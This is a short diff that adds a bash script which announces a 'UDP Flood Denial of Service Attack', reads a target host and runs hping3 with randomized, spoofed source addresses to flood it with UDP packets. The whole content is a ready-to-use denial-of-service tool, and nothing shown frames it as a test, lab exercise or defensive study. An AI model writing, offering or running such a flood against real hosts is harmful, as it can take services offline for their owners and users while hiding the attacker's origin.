@@ -1,0 +1,6 @@
+#!/bin/bash
+
+echo "Performing UDP Flood Denial of Service Attack...";
+read host
+hping3 --rand-source --udp $host
+
